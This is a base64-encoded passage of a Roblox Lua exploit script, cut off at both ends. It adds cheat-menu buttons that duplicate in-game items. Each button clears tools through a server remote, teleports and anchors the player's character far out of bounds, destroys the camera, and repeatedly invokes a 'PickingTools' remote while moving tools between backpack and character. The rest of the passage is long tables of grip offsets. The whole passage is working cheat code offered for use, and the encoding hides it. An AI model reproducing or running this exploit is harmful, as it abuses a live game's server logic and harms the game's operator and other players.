pLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMTEgLCAzLCAzMCksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygxMiAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDEzICwgMywgMzApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMTQgLCAzLCAzMCksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygxNSAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDE2ICwgMywgMzApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMTcgLCAzLCAzMCksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygxOCAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDE5ICwgMywgMzApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMjAgLCAzLCAzMCksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygyMSAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDIyICwgMywgMzApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMjMgLCAzLCAzMCksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygyNCAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDI1ICwgMywgMzApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMjYgLCAzLCAzMCksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygyNyAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDI4ICwgMywgMzApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMjgsIDMsIDYpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMjcsIDMsIDYpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMjYsIDMsIDYpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMjUsIDMsIDYpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMjQsIDMsIDYpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMjMsIDMsIDYpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMjIsIDMsIDYpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMjEsIDMsIDYpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMjEsIDMsIDE3KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDIyLCAzLCAxNyksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygyMywgMywgMTcpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMjQsIDMsIDE3KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDI1LCAzLCAxNyksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygyNiwgMywgMTcpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMjcsIDMsIDE3KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDI4LCAzLCAxNyksCiAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yIGksIHRvb2wgaW4gcGFpcnMoZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrOkdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHRvb2w6SXNBKCJUb29sIikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLS0gTW92ZSB0aGUgdG9vbCB0byB0aGUgcGxheWVyIGNoYXJhY3RlcgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdG9vbC5QYXJlbnQgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC0tIFNldHRpbmcgdGhlIGdyaXAgcG9zaXRpb24gaW5kZXgKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIGdyaXBQb3NJbmRleCA9IG1hdGgubWluKGksICNHcmlwUG9zVGFibGUpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBncmlwUG9zID0gR3JpcFBvc1RhYmxlW2dyaXBQb3NJbmRleF0KICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC0tIFNldCB0aGUgZ3JpcCBwb3NpdGlvbiAoR3JpcFBvcykgaWYgdGhlIHRvb2wgaXMgaW4gdGhlIHBsYXllcidzIGNoYXJhY3RlcgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgdG9vbDpJc0Rlc2NlbmRhbnRPZihnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdG9vbC5HcmlwUG9zID0gZ3JpcFBvcwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHdhcm4oIlRvb2wiLCB0b29sLk5hbWUsICJpcyBub3QgaW4gY2hhcmFjdGVyIikKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgIGVuZAp9KQoKLS0gQnV0dG9uIGZvciBGaXJlIENyb3NzClRvb2xzVGFiOkFkZEJ1dHRvbih7CiAgICBOYW1lID0gIkZpcmUgQ3Jvc3MiLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgbG9jYWwgbmFtZXRvb2xzID0gIkNyeXN0YWwgQ3Jvc3MiCiAgICAgICAgbG9jYWwgb2xkY2ZyYW1lID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkNGcmFtZQogICAgICAgIGdhbWU6R2V0U2VydmljZSgiU3RhcnRlckd1aSIpOlNldENvcmUoIlNlbmROb3RpZmljYXRpb24iLCB7CiAgICAgICAgICAgIFRpdGxlID0gIkF1cmFseW54IGlzIGR1cGluZy4uLiIsCiAgICAgICAgICAgIFRleHQgPSAiUGxlYXNlIGRvIG5vdCBlcXVpcCBhbnkgdG9vbHMgb3IgdW5lcXVpcCB0b29scyBvciBjbGljayB0b29scyBvbiBpbnZlbnRvcnkuIEl0IHdpbGwgYnJlYWsgdGhlIHNjcmlwdC4iLAogICAgICAgICAgICBCdXR0b24xID0gIk9rIiwKICAgICAgICAgICAgRHVyYXRpb24gPSA1CiAgICAgICAgfSkKICAgICAgICBsb2NhbCB0b29sdGhhdGl3YW50dG9kdXBlID0gIlBhcGVyYmFnRmlyZSIKICAgICAgICBsb2NhbCB0b29scyA9ICJQYXBlcmJhZ0ZpcmUiCiAgICAgICAgaWYgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZC5TaXQgPT0gdHJ1ZSB0aGVuCiAgICAgICAgICAgIHRhc2sud2FpdCgpCiAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWQuU2l0ID0gZmFsc2UKICAgICAgICBlbmQKICAgICAgICB3YWl0KDAuMSkKICAgICAgICBsb2NhbCBhcmdzID0gewogICAgICAgICAgICBbMV0gPSAiQ2xlYXJBbGxUb29scyIKICAgICAgICB9CiAgICAgICAgY2xlYXJ0b29scmVtb3RlOkZpcmVTZXJ2ZXIodW5wYWNrKGFyZ3MpKQogICAgICAgIGlmIGdhbWU6R2V0U2VydmljZSgiV29ya3NwYWNlIik6RmluZEZpcnN0Q2hpbGQoIkNhbWVyYSIpIHRoZW4KICAgICAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJXb3Jrc3BhY2UiKTpGaW5kRmlyc3RDaGlsZCgiQ2FtZXJhIik6RGVzdHJveSgpCiAgICAgICAgZW5kCiAgICAgICAgZm9yIG0gPSAxLCAyIGRvCiAgICAgICAgICAgIHRhc2sud2FpdCgpCiAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5DRnJhbWUgPSBDRnJhbWUubmV3KDk5OTk5OTk5OS40MTQsIC00OTAsIDk5OTk5OTk5OS40MTQsIDAuOTc0MzYwNDA2LCAtMC4xNzU3MzQwODgsIDAuMTQwNDk3NjEsIC0wLjEzMzQ0MTQwNCwgMC4wNTE0MDUzMDY5LCAwLjk4OTcyMjcyOSwgLTAuMTgxMTUwMzAyLCAtMC45ODMwOTQ2OTIsIDAuMDI2NjM3MDkyMikKICAgICAgICBlbmQKICAgICAgICB0YXNrLndhaXQoMC4yKQogICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5BbmNob3JlZCA9IHRydWUKICAgICAgICB3YWl0KDAuMykKICAgICAgICBsb2NhbCBkdXBpbmcgPSB0cnVlCiAgICAgICAgZm9yIG0gPSAxLCA1NyBkbwogICAgICAgICAgICBpZiBkdXBpbmcgPT0gZmFsc2UgdGhlbgogICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkFuY2hvcmVkID0gZmFsc2UKICAgICAgICAgICAgICAgIHJldHVybgogICAgICAgICAgICBlbmQKICAgICAgICAgICAgaWYgZ2FtZTpHZXRTZXJ2aWNlKCJXb3Jrc3BhY2UiKTpGaW5kRmlyc3RDaGlsZCgiQ2FtZXJhIikgdGhlbgogICAgICAgICAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJXb3Jrc3BhY2UiKTpGaW5kRmlyc3RDaGlsZCgiQ2FtZXJhIik6RGVzdHJveSgpCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICBsb2NhbCBhcmdzID0gewogICAgICAgICAgICAgICAgWzFdID0gIlBpY2tpbmdUb29scyIsCiAgICAgICAgICAgICAgICBbMl0gPSB0b29sdGhhdGl3YW50dG9kdXBlCiAgICAgICAgICAgIH0KICAgICAgICAgICAgcGlja3Rvb2xyZW1vdGU6SW52b2tlU2VydmVyKHVucGFjayhhcmdzKSkKICAgICAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIuQmFja3BhY2s6V2FpdEZvckNoaWxkKHRvb2x0aGF0aXdhbnR0b2R1cGUpLlBhcmVudCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgICAgICAgICAgaWYgZHVwaW5nID09IGZhbHNlIHRoZW4KICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5BbmNob3JlZCA9IGZhbHNlCiAgICAgICAgICAgICAgICByZXR1cm4KICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIHdhaXQoKQogICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5DaGFyYWN0ZXJbdG9vbHRoYXRpd2FudHRvZHVwZV06RmluZEZpcnN0Q2hpbGQoIkhhbmRsZSIpLk5hbWUgPSAiSMOibmRsw6oiCiAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCh0b29sdGhhdGl3YW50dG9kdXBlKS5QYXJlbnQgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2sKICAgICAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIuQmFja3BhY2s6RmluZEZpcnN0Q2hpbGQodG9vbHRoYXRpd2FudHRvZHVwZSkuUGFyZW50ID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgICAgICAgICByZXBlYXQKICAgICAgICAgICAgICAgIGlmIGdhbWU6R2V0U2VydmljZSgiV29ya3NwYWNlIik6RmluZEZpcnN0Q2hpbGQoIkNhbWVyYSIpIHRoZW4KICAgICAgICAgICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIldvcmtzcGFjZSIpOkZpbmRGaXJzdENoaWxkKCJDYW1lcmEiKTpEZXN0cm95KCkKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgd2FpdCgpCiAgICAgICAgICAgIHVudGlsIGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCh0b29sdGhhdGl3YW50dG9kdXBlKSA9PSBuaWwKICAgICAgICBlbmQKICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQW5jaG9yZWQgPSBmYWxzZQogICAgICAgIHJlcGVhdCB3YWl0KCkgdW50aWwgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpID09IG5pbAogICAgICAgIHJlcGVhdCB3YWl0KCkgdW50aWwgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCiAgICAgICAgbG9jYWwgdG9vbGdyaXAgPSB0cnVlCiAgICAgICAgZHVwaW5nID0gZmFsc2UKICAgICAgICB3YWl0KCkKICAgICAgICBsb2NhbCBncmlwQmFzZSA9IENGcmFtZS5uZXcoLTAuMjkwMDg2NzQ2LCAwLjA3NTU4MTA3MzgsIC0wLjAxMDk4NzI4MTgsIDAuMDQzOTU2MDQxMywgMC41MDk3MDU5MDEsIC0wLjg1OTIyNTA5NCwgLTAuMDU5MTQ1MDYzMiwgLTAuODU3MjIwMTczLCAtMC41MTE1NDIyNjEsIC0wLjk5NzI4MTEzNCwgMC4wNzMzMDQyODA2LCAtMC4wMDc1MzM0MzEwNSkKICAgICAgICBsb2NhbCBncmlwUG9zaXRpb25zID0gewogICAgICAgICAgICBWZWN0b3IzLm5ldygwLCAwLCAwKSwgVmVjdG9yMy5uZXcoMCwgMC41LCAwKSwgVmVjdG9yMy5uZXcoMCwgMSwgMCksIFZlY3RvcjMubmV3KDAsIDEuNSwgMCksCiAgICAgICAgICAgIFZlY3RvcjMubmV3KDAsIDIsIDApLCBWZWN0b3IzLm5ldygwLCAyLjUsIDApLCBWZWN0b3IzLm5ldygwLCAzLCAwKSwgVmVjdG9yMy5uZXcoMCwgMy41LCAwKSwKICAgICAgICAgICAgVmVjdG9yMy5uZXcoMCwgNCwgMCksIFZlY3RvcjMubmV3KDAsIDQuNSwgMCksIFZlY3RvcjMubmV3KDAsIDUsIDApLCBWZWN0b3IzLm5ldygwLCA1LCAtMSksCiAgICAgICAgICAgIFZlY3RvcjMubmV3KDAsIDUsIC0yKSwgVmVjdG9yMy5uZXcoMCwgNSwgLTMpLCBWZWN0b3IzLm5ldygwLCA1LCAtNCksIFZlY3RvcjMubmV3KDAsIDUsIC01KSwKICAgICAgICAgICAgVmVjdG9yMy5uZXcoMCwgNSwgLTYpLCBWZWN0b3IzLm5ldygwLCA1LCAtNyksIFZlY3RvcjMubmV3KDAsIDUsIC04KSwgVmVjdG9yMy5uZXcoMCwgNSwgLTkpLAogICAgICAgICAgICBWZWN0b3IzLm5ldygwLCA1LCAtMTApLCBWZWN0b3IzLm5ldygwLCA1LjUsIC0xMCksIFZlY3RvcjMubmV3KDAsIDYsIC0xMCksIFZlY3RvcjMubmV3KDAsIDYuNSwgLTEwKSwKICAgICAgICAgICAgVmVjdG9yMy5uZXcoMCwgNywgLTEwKSwgVmVjdG9yMy5uZXcoMCwgNy41LCAtMTApLCBWZWN0b3IzLm5ldygwLCA4LCAtMTApLCBWZWN0b3IzLm5ldygwLCA4LjUsIC0xMCksCiAgICAgICAgICAgIFZlY3RvcjMubmV3KDAsIDksIC0xMCksIFZlY3RvcjMubmV3KDAsIDkuNSwgLTEwKSwgVmVjdG9yMy5uZXcoMCwgMTAsIC0xMCksIFZlY3RvcjMubmV3KDAsIDEwLCAtNSksCiAgICAgICAgICAgIFZlY3RvcjMubmV3KDAsIDEwLCAtNC41KSwgVmVjdG9yMy5uZXcoMCwgMTAsIC00KSwgVmVjdG9yMy5uZXcoMCwgMTAsIC0zLjUpLCBWZWN0b3IzLm5ldygwLCAxMCwgLTMpLAogICAgICAgICAgICBWZWN0b3IzLm5ldygwLCAxMCwgLTIuNSksIFZlY3RvcjMubmV3KDAsIDEwLCAtMiksIFZlY3RvcjMubmV3KDAsIDEwLCAtMS41KSwgVmVjdG9yMy5uZXcoMCwgMTAsIC0xKSwKICAgICAgICAgICAgVmVjdG9yMy5uZXcoMCwgMTAsIC0wLjUpLCBWZWN0b3IzLm5ldygwLCAxMCwgMCksIFZlY3RvcjMubmV3KDAsIDksIC01KSwgVmVjdG9yMy5uZXcoMCwgOCwgLTUpLAogICAgICAgICAgICBWZWN0b3IzLm5ldygwLCA3LCAtNSksIFZlY3RvcjMubmV3KDAsIDYsIC01KSwgVmVjdG9yMy5uZXcoMCwgNSwgLTUpLCBWZWN0b3IzLm5ldygwLCA0LCAtNSksCiAgICAgICAgICAgIFZlY3RvcjMubmV3KDAsIDMsIC01KSwgVmVjdG9yMy5uZXcoMCwgMiwgLTUpLCBWZWN0b3IzLm5ldygwLCAxLCAtNSksIFZlY3RvcjMubmV3KDAsIDAsIC01KSwKICAgICAgICAgICAgVmVjdG9yMy5uZXcoMCwgMCwgLTEwKSwgVmVjdG9yMy5uZXcoMCwgMCwgLTkpLCBWZWN0b3IzLm5ldygwLCAwLCAtOCksIFZlY3RvcjMubmV3KDAsIDAsIC03KSwKICAgICAgICAgICAgVmVjdG9yMy5uZXcoMCwgMCwgLTYpCiAgICAgICAgfQogICAgICAgIGZvciBfLCBwb3MgaW4gaXBhaXJzKGdyaXBQb3NpdGlvbnMpIGRvCiAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1t0b29sc10uR3JpcCA9IGdyaXBCYXNlICsgcG9zCiAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1t0b29sc10uTmFtZSA9IG5hbWV0b29scwogICAgICAgIGVuZAogICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5DRnJhbWUgPSBvbGRjZnJhbWUKICAgICAgICB3YWl0KDAuNSkKICAgICAgICBmb3IgXywgdG9vbCBpbiBpcGFpcnMoZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIuQmFja3BhY2s6R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICAgICAgaWYgdG9vbDpJc0EoIlRvb2wiKSBhbmQgdG9vbC5OYW1lID09IG5hbWV0b29scyB0aGVuCiAgICAgICAgICAgICAgICB0b29sLlBhcmVudCA9IGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIGVuZAp9KQoKLS0gQnV0dG9uIGZvciBDcnlzdGFsIENyb3NzClRvb2xzVGFiOkFkZEJ1dHRvbih7CiAgICBOYW1lID0gIkNyeXN0YWwgQ3Jvc3MiLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgbG9jYWwgbmFtZXRvb2xzID0gIkNyeXN0YWwgQ3Jvc3MgbG9sIgogICAgICAgIGxvY2FsIG9sZGNmcmFtZSA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5DRnJhbWUKICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlN0YXJ0ZXJHdWkiKTpTZXRDb3JlKCJTZW5kTm90aWZpY2F0aW9uIiwgewogICAgICAgICAgICBUaXRsZSA9ICJBdXJhbHlueCBpcyBkdXBpbmcuLi4iLAogICAgICAgICAgICBUZXh0ID0gIlBsZWFzZSBkbyBub3QgZXF1aXAgYW55IHRvb2xzIG9yIHVuZXF1aXAgdG9vbHMgb3IgY2xpY2sgdG9vbHMgb24gaW52ZW50b3J5LiBJdCB3aWxsIGJyZWFrIHRoZSBzY3JpcHQuIiwKICAgICAgICAgICAgQnV0dG9uMSA9ICJPayIsCiAgICAgICAgICAgIER1cmF0aW9uID0gNQogICAgICAgIH0pCiAgICAgICAgbG9jYWwgdG9vbHRoYXRpd2FudHRvZHVwZSA9ICJDcnlzdGFsIgogICAgICAgIGxvY2FsIHRvb2xzID0gIkNyeXN0YWwiCiAgICAgICAgaWYgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZC5TaXQgPT0gdHJ1ZSB0aGVuCiAgICAgICAgICAgIHRhc2sud2FpdCgpCiAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWQuU2l0ID0gZmFsc2UKICAgICAgICBlbmQKICAgICAgICB3YWl0KDAuMSkKICAgICAgICBsb2NhbCBhcmdzID0gewogICAgICAgICAgICBbMV0gPSAiQ2xlYXJBbGxUb29scyIKICAgICAgICB9CiAgICAgICAgY2xlYXJ0b29scmVtb3RlOkZpcmVTZXJ2ZXIodW5wYWNrKGFyZ3MpKQogICAgICAgIGlmIGdhbWU6R2V0U2VydmljZSgiV29ya3NwYWNlIik6RmluZEZpcnN0Q2hpbGQoIkNhbWVyYSIpIHRoZW4KICAgICAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJXb3Jrc3BhY2UiKTpGaW5kRmlyc3RDaGlsZCgiQ2FtZXJhIik6RGVzdHJveSgpCiAgICAgICAgZW5kCiAgICAgICAgZm9yIG0gPSAxLCAyIGRvCiAgICAgICAgICAgIHRhc2sud2FpdCgpCiAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5DRnJhbWUgPSBDRnJhbWUubmV3KDk5OTk5OTk5OS40MTQsIC00OTAsIDk5OTk5OTk5OS40MTQsIDAuOTc0MzYwNDA2LCAtMC4xNzU3MzQwODgsIDAuMTQwNDk3NjEsIC0wLjEzMzQ0MTQwNCwgMC4wNTE0MDUzMDY5LCAwLjk4OTcyMjcyOSwgLTAuMTgxMTUwMzAyLCAtMC45ODMwOTQ2OTIsIDAuMDI2NjM3MDkyMikKICAgICAgICBlbmQKICAgICAgICB0YXNrLndhaXQoMC4yKQogICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5BbmNob3JlZCA9IHRydWUKICAgICAgICB3YWl0KDAuMykKICAgICAgICBsb2NhbCBkdXBpbmcgPSB0cnVlCiAgICAgICAgZm9yIG0gPSAxLCA1NyBkbwogICAgICAgICAgICBpZiBkdXBpbmcgPT0gZmFsc2UgdGhlbgogICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkFuY2hvcmVkID0gZmFsc2UKICAgICAgICAgICAgICAgIHJldHVybgogICAgICAgICAgICBlbmQKICAgICAgICAgICAgaWYgZ2FtZTpHZXRTZXJ2aWNlKCJXb3Jrc3BhY2UiKTpGaW5kRmlyc3RDaGlsZCgiQ2FtZXJhIikgdGhlbgogICAgICAgICAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJXb3Jrc3BhY2UiKTpGaW5kRmlyc3RDaGlsZCgiQ2FtZXJhIik6RGVzdHJveSgpCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICBsb2NhbCBhcmdzID0gewogICAgICAgICAgICAgICAgWzFdID0gIlBpY2tpbmdUb29scyIsCiAgICAgICAgICAgICAgICBbMl0gPSB0b29sdGhhdGl3YW50dG9kdXBlCiAgICAgICAgICAgIH0KICAgICAgICAgICAgcGlja3Rvb2xyZW1vdGU6SW52b2tlU2VydmVyKHVucGFjayhhcmdzKSkKICAgICAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIuQmFja3BhY2s6V2FpdEZvckNoaWxkKHRvb2x0aGF0aXdhbnR0b2R1cGUpLlBhcmVudCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgICAgICAgICAgaWYgZHVwaW5nID09IGZhbHNlIHRoZW4KICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5BbmNob3JlZCA9IGZhbHNlCiAgICAgICAgICAgICAgICByZXR1cm4KICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIHdhaXQoKQogICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5DaGFyYWN0ZXJbdG9vbHRoYXRpd2FudHRvZHVwZV06RmluZEZpcnN0Q2hpbGQoIkhhbmRsZSIpLk5hbWUgPSAiSMOibmRsw6oiCiAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCh0b29sdGhhdGl3YW50dG9kdXBlKS5QYXJlbnQgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2sKICAgICAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIuQmFja3BhY2s6RmluZEZpcnN0Q2hpbGQodG9vbHRoYXRpd2FudHRvZHVwZSkuUGFyZW50ID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgICAgICAgICByZXBlYXQKICAgICAgICAgICAgICAgIGlmIGdhbWU6R2V0U2VydmljZSgiV29ya3NwYWNlIik6RmluZEZpcnN0Q2hpbGQoIkNhbWVyYSIpIHRoZW4KICAgICAgICAgICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIldvcmtzcGFjZSIpOkZpbmRGaXJzdENoaWxkKCJDYW1lcmEiKTpEZXN0cm95KCkKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgd2FpdCgpCiAgICAgICAgICAgIHVudGlsIGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCh0b29sdGhhdGl3YW50dG9kdXBlKSA9PSBuaWwKICAgICAgICBlbmQKICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQW5jaG9yZWQgPSBmYWxzZQogICAgICAgIHJlcGVhdCB3YWl0KCkgdW50aWwgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpID09IG5pbAogICAgICAgIHJlcGVhdCB3YWl0KCkgdW50aWwgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCiAgICAgICAgbG9jYWwgdG9vbGdyaXAgPSB0cnVlCiAgICAgICAgZHVwaW5nID0gZmFsc2UKICAgICAgICB3YWl0KCkKICAgICAgICBsb2NhbCBncmlwQmFzZSA9IENGcmFtZS5uZXcoLTAuMjkwMDg2NzQ2LCAwLjA3NTU4MTA3MzgsIC0wLjAxMDk4NzI4MTgsIDAuMDQzOTU2MDQxMywgMC41MDk3MDU5MDEsIC0wLjg1OTIyNTA5NCwgLTAuMDU5MTQ1MDYzMiwgLTAuODU3MjIwMTczLCAtMC41MTE1NDIyNjEsIC0wLjk5NzI4MTEzNCwgMC4wNzMzMDQyODA2LCAtMC4wMDc1MzM0MzEwNSkKICAgICAgICBsb2NhbCBncmlwUG9zaXRpb25zID0gewogICAgICAgICAgICBWZWN0b3IzLm5ldygwLCAwLCAwKSwgVmVjdG9yMy5uZXcoMCwgMC41LCAwKSwgVmVjdG9yMy5uZXcoMCwgM